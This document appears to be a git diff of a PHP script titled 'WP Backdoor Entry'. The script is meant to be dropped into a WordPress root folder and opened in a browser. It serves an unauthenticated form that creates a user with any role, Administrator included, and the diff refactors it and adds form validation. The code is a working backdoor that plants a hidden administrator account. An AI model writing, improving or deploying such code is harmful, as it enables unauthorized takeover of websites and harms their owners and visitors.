@@ -3,7 +3,7 @@
 
   Script Name: WP Backdoor Entry
   
-  Description: A script to create a new user with specified role.
+  Description: A script to create a new user with Administrator role.
   
   Usage: Copy this file into your WordPress root folder and execute the script via the browser.
 
@@ -15,19 +15,6 @@ $username   = '';
 $email      = '';
 $password   = '';
 $role       = '';
-
-if (isset($_POST['name'])) {
-  $username  = htmlentities($_POST['name']);
-}
-if (isset($_POST['email'])) {
-  $email     = htmlentities($_POST['email']);
-}
-if (isset($_POST['password'])) {
-  $password  = htmlentities($_POST['password']);
-}
-if (isset($_POST['role'])) {
-  $role     = htmlentities($_POST['role']);
-}
 
 /** Make sure that the WordPress bootstrap has run before continuing. */
 if (!empty($wp_folder)) {
@@ -42,35 +29,39 @@ if (!file_exists($wp_load_path)) {
   exit;
 }
 
-function vc_create_administrator($username, $password, $email, $role, $wp_load_path)
+include($wp_load_path);
+
+function ac_create_wp_user($username, $email, $password, $role)
 {
 
-  include($wp_load_path);
+  if( isset($_POST['submit'])) {
+    $username  = htmlentities($_POST['name']);
+    $email     = htmlentities($_POST['email']);
+    $password  = htmlentities($_POST['password']);
+    $role      = strtolower(htmlentities($_POST['role']));
+  }
 
   if (!username_exists($username) && !email_exists($email)) {
+
     $user_id = wp_create_user($username, $password, $email);
     $user = new WP_User($user_id);
     $user->set_role($role);
+
   } else {
     echo 'ERROR! The username or email is already exists!';
     echo '<br>';
     exit;
   }
 
-  if (!empty($username)) {
-    echo "<script>location.href='/wp-login.php';</script>";
+  if (! empty($username) && ! empty($password) && ! empty($email)) {
+    header("Location: /wp-login.php");
+    exit;
   }
 }
 
-/**
- * Invoke the function
- */
-vc_create_administrator($username, $password, $email, $role, $wp_load_path);
+ac_create_wp_user($username, $password, $email, $role);
 
-/**
- * Hook into WordPress action
- */
-add_action('init', 'vc_create_administrator');
+add_action('init', 'ac_create_wp_user');
 
 ?>
 
@@ -90,6 +81,7 @@ add_action('init', 'vc_create_administrator');
 
     /* Style inputs, select elements and textareas */
     input[type=text],
+    input[type=email],
     input[type=password],
     select,
     textarea {
@@ -174,7 +166,7 @@ add_action('init', 'vc_create_administrator');
           <label for="fname">Username</label>
         </div>
         <div class="col-75">
-          <input type="text" id="fname" name="name" placeholder="Username">
+          <input type="text" id="fname" name="name" placeholder="Username" required autocomplete="off">
         </div>
       </div>
       <div class="row">
@@ -182,7 +174,7 @@ add_action('init', 'vc_create_administrator');
           <label for="lname">Email</label>
         </div>
         <div class="col-75">
-          <input type="text" id="lname" name="email" placeholder="E-Mail">
+          <input type="email" id="lname" name="email" placeholder="E-Mail" required autocomplete="off">
         </div>
       </div>
       <div class="row">
@@ -190,7 +182,7 @@ add_action('init', 'vc_create_administrator');
           <label for="lname">Password</label>
         </div>
         <div class="col-75">
-          <input type="password" id="lname" name="password" placeholder="Password">
+          <input type="password" id="lname" name="password" placeholder="Password" required>
         </div>
       </div>
       <div class="row">
@@ -199,18 +191,18 @@ add_action('init', 'vc_create_administrator');
         </div>
         <div class="col-75">
           <select id="role" name="role">
-            <option value="administrator">Administrator</option>
-            <option value="subscriber">Subscriber</option>
-            <option value="contributor">Contributor</option>
-            <option value="author">Author</option>
-            <option value="editor">Editor</option>
+            <option>Subscriber</option>
+            <option>Contributor</option>
+            <option>Author</option>
+            <option>Editor</option>
+            <option>Administrator</option>
           </select>
         </div>
       </div>
       <br>
       <br>
       <div class="row">
-        <input type="submit" value="Submit">
+        <input type="submit" value="Submit" name="submit">
       </div>
     </form>
   </div>
